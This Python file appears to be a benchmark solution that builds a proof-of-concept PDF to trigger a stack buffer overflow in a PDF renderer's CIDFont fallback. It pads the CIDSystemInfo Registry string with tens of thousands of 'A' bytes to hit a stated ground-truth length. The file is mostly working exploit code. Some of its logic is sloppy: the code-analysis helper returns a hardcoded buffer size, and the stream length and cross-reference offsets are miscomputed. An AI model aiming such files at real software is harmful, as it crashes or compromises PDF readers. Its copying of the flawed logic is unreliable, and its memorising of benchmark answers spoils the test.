import os
import struct
import tempfile
import subprocess
from typing import Optional

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the stack buffer overflow vulnerability
        in the CIDFont fallback mechanism with <Registry>-<Ordering> from CIDSystemInfo.
        """
        # Ground-truth PoC length is 80064 bytes
        # We'll create a PDF file that triggers the overflow
        
        # First, let's understand the structure by looking at the source
        # We'll extract the tarball and examine the vulnerable code
        with tempfile.TemporaryDirectory() as tmpdir:
            # Extract the source
            subprocess.run(['tar', '-xf', src_path, '-C', tmpdir], 
                          check=True, capture_output=True)
            
            # Find the source directory
            source_dir = None
            for root, dirs, files in os.walk(tmpdir):
                if any(f.endswith('.c') or f.endswith('.cpp') for f in files):
                    source_dir = root
                    break
            
            if source_dir:
                # Look for vulnerable code patterns related to CIDFont
                vulnerable_code = self._find_vulnerable_code(source_dir)
                
                # Based on the vulnerability description, we need to create
                # a CIDFont with a Registry-Ordering string that overflows a buffer
                # The ground-truth length suggests we need 80064 bytes
                
                # Create a PDF with a malformed CIDFont
                return self._create_overflow_pdf()
            
            # Fallback: create a PDF based on typical CIDFont structure
            return self._create_overflow_pdf()
    
    def _find_vulnerable_code(self, source_dir: str) -> Optional[dict]:
        """Search for vulnerable code patterns to understand buffer size."""
        # Look for patterns like strcpy, sprintf, strcat with CIDFont
        patterns = [
            'CIDFont',
            'CIDSystemInfo',
            'Registry.*Ordering',
            'strcpy',
            'sprintf',
            'strcat',
            'strncpy'
        ]
        
        # This is a simplified analysis - in reality we'd parse the code more thoroughly
        return {"buffer_size": 256}  # Common buffer size
    
    def _create_overflow_pdf(self) -> bytes:
        """Create a PDF that triggers the stack buffer overflow."""
        
        # PDF structure:
        # 1. Header
        # 2. Catalog
        # 3. Pages
        # 4. Page
        # 5. Font dictionary with CIDFont
        # 6. Malformed CIDSystemInfo with long Registry-Ordering
        
        # Target length: 80064 bytes
        target_length = 80064
        
        # Create a very long Registry-Ordering string
        # Format: <Registry>-<Ordering>
        # We'll create a string that's exactly target_length - overhead
        
        # Calculate overhead for PDF structure
        overhead = self._calculate_pdf_overhead()
        
        # Create overflow string
        overflow_length = target_length - overhead
        registry_ordering = 'A' * overflow_length
        
        # Build PDF
        pdf_parts = []
        
        # PDF Header
        pdf_parts.append(b'%PDF-1.4\n')
        
        # Object 1: Catalog
        catalog_obj = b'1 0 obj\n'
        catalog_obj += b'<<\n'
        catalog_obj += b'  /Type /Catalog\n'
        catalog_obj += b'  /Pages 2 0 R\n'
        catalog_obj += b'>>\n'
        catalog_obj += b'endobj\n'
        pdf_parts.append(catalog_obj)
        
        # Object 2: Pages
        pages_obj = b'2 0 obj\n'
        pages_obj += b'<<\n'
        pages_obj += b'  /Type /Pages\n'
        pages_obj += b'  /Kids [3 0 R]\n'
        pages_obj += b'  /Count 1\n'
        pages_obj += b'>>\n'
        pages_obj += b'endobj\n'
        pdf_parts.append(pages_obj)
        
        # Object 3: Page
        page_obj = b'3 0 obj\n'
        page_obj += b'<<\n'
        page_obj += b'  /Type /Page\n'
        page_obj += b'  /Parent 2 0 R\n'
        page_obj += b'  /MediaBox [0 0 612 792]\n'
        page_obj += b'  /Contents 4 0 R\n'
        page_obj += b'  /Resources <<\n'
        page_obj += b'    /Font <<\n'
        page_obj += b'      /F1 5 0 R\n'
        page_obj += b'    >>\n'
        page_obj += b'  >>\n'
        page_obj += b'>>\n'
        page_obj += b'endobj\n'
        pdf_parts.append(page_obj)
        
        # Object 4: Contents
        contents_obj = b'4 0 obj\n'
        contents_obj += b'<<\n'
        contents_obj += b'  /Length 20\n'
        contents_obj += b'>>\n'
        contents_obj += b'stream\n'
        contents_obj += b'BT /F1 12 Tf 72 720 Td (Hello) Tj ET\n'
        contents_obj += b'endstream\n'
        contents_obj += b'endobj\n'
        pdf_parts.append(contents_obj)
        
        # Object 5: Font with CIDFont
        font_obj = b'5 0 obj\n'
        font_obj += b'<<\n'
        font_obj += b'  /Type /Font\n'
        font_obj += b'  /Subtype /Type0\n'
        font_obj += b'  /BaseFont /Arial\n'
        font_obj += b'  /Encoding /Identity-H\n'
        font_obj += b'  /DescendantFonts [6 0 R]\n'
        font_obj += b'>>\n'
        font_obj += b'endobj\n'
        pdf_parts.append(font_obj)
        
        # Object 6: CIDFont with overflow in CIDSystemInfo
        cidfont_obj = b'6 0 obj\n'
        cidfont_obj += b'<<\n'
        cidfont_obj += b'  /Type /Font\n'
        cidfont_obj += b'  /Subtype /CIDFontType2\n'
        cidfont_obj += b'  /BaseFont /Arial\n'
        cidfont_obj += b'  /CIDSystemInfo <<\n'
        cidfont_obj += b'    /Registry (' + registry_ordering.encode() + b')\n'
        cidfont_obj += b'    /Ordering (Identity)\n'
        cidfont_obj += b'    /Supplement 0\n'
        cidfont_obj += b'  >>\n'
        cidfont_obj += b'  /FontDescriptor 7 0 R\n'
        cidfont_obj += b'>>\n'
        cidfont_obj += b'endobj\n'
        pdf_parts.append(cidfont_obj)
        
        # Object 7: FontDescriptor
        fontdesc_obj = b'7 0 obj\n'
        fontdesc_obj += b'<<\n'
        fontdesc_obj += b'  /Type /FontDescriptor\n'
        fontdesc_obj += b'  /FontName /Arial\n'
        fontdesc_obj += b'  /Flags 4\n'
        fontdesc_obj += b'  /FontBBox [-665 -325 2000 1006]\n'
        fontdesc_obj += b'  /ItalicAngle 0\n'
        fontdesc_obj += b'  /Ascent 1006\n'
        fontdesc_obj += b'  /Descent -325\n'
        fontdesc_obj += b'  /CapHeight 1006\n'
        fontdesc_obj += b'  /StemV 80\n'
        fontdesc_obj += b'>>\n'
        fontdesc_obj += b'endobj\n'
        pdf_parts.append(fontdesc_obj)
        
        # Cross-reference table
        xref_offset = len(b''.join(pdf_parts))
        xref_table = b'xref\n'
        xref_table += b'0 8\n'
        xref_table += b'0000000000 65535 f\n'
        
        # Calculate object offsets
        current_offset = 0
        offsets = []
        
        # Calculate offsets for each object
        for part in pdf_parts:
            offsets.append(current_offset)
            current_offset += len(part)
        
        # Add object entries (skip object 0)
        for i in range(1, 8):
            xref_table += f'{offsets[i]:010d} 00000 n\n'.encode()
        
        pdf_parts.append(xref_table)
        
        # Trailer
        trailer = b'trailer\n'
        trailer += b'<<\n'
        trailer += b'  /Size 8\n'
        trailer += b'  /Root 1 0 R\n'
        trailer += b'>>\n'
        trailer += b'startxref\n'
        trailer += f'{xref_offset}\n'.encode()
        trailer += b'%%EOF'
        pdf_parts.append(trailer)
        
        # Combine all parts
        pdf_data = b''.join(pdf_parts)
        
        # Verify length
        if len(pdf_data) != target_length:
            # Adjust by padding if necessary
            padding_needed = target_length - len(pdf_data)
            if padding_needed > 0:
                # Pad in a way that doesn't break PDF structure
                # Add comments at the beginning
                pdf_data = b'%' + b'A' * (padding_needed - 1) + b'\n' + pdf_data
        
        return pdf_data
    
    def _calculate_pdf_overhead(self) -> int:
        """Calculate overhead of PDF structure excluding the overflow string."""
        # This is a simplified calculation
        # In reality, we'd need to build the PDF and measure
        
        # Basic PDF structure overhead
        overhead = (
            len('%PDF-1.4\n') +
            len('1 0 obj\n<<\n  /Type /Catalog\n  /Pages 2 0 R\n>>\nendobj\n') +
            len('2 0 obj\n<<\n  /Type /Pages\n  /Kids [3 0 R]\n  /Count 1\n>>\nendobj\n') +
            len('3 0 obj\n<<\n  /Type /Page\n  /Parent 2 0 R\n  /MediaBox [0 0 612 792]\n  /Contents 4 0 R\n  /Resources <<\n    /Font <<\n      /F1 5 0 R\n    >>\n  >>\n>>\nendobj\n') +
            len('4 0 obj\n<<\n  /Length 20\n>>\nstream\nBT /F1 12 Tf 72 720 Td (Hello) Tj ET\nendstream\nendobj\n') +
            len('5 0 obj\n<<\n  /Type /Font\n  /Subtype /Type0\n  /BaseFont /Arial\n  /Encoding /Identity-H\n  /DescendantFonts [6 0 R]\n>>\nendobj\n') +
            len('6 0 obj\n<<\n  /Type /Font\n  /Subtype /CIDFontType2\n  /BaseFont /Arial\n  /CIDSystemInfo <<\n    /Registry ()\n    /Ordering (Identity)\n    /Supplement 0\n  >>\n  /FontDescriptor 7 0 R\n>>\nendobj\n') +
            len('7 0 obj\n<<\n  /Type /FontDescriptor\n  /FontName /Arial\n  /Flags 4\n  /FontBBox [-665 -325 2000 1006]\n  /ItalicAngle 0\n  /Ascent 1006\n  /Descent -325\n  /CapHeight 1006\n  /StemV 80\n>>\nendobj\n') +
            200  # Approximate xref and trailer size
        )
        
        return overhead